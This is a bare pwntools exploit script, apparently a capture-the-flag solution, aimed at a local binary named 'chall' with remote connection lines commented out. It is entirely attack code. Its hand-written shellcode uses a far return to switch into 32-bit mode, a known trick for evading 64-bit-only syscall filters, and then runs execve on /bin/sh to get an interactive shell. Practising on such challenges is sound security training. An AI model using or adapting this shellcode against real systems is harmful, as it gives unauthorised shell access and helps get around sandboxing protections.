#!/usr/bin/env python3
from pwn import *
 
bin_file = './chall'
context(os = 'linux', arch = 'amd64')
#HOST = ''
#PORT = 
 
binf = ELF(bin_file)
 
def attack(io, **kwargs):
    shellcode = b'\x48\x31\xe4\xbc\x88\x40\x40\x00\xc7\x04\x24\x18\x00\x42\x69\xc7\x44\x24\x04\x23\x00\x00\x00\xcb'\
                b'\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80'
    io.recvline()
    io.sendline(shellcode)
 
def main():
    io = process(bin_file)
    #io = remote(HOST, PORT)
    attack(io)
    #gdb.attach(io, '')
    io.interactive()
 
if __name__ == '__main__':
    main()
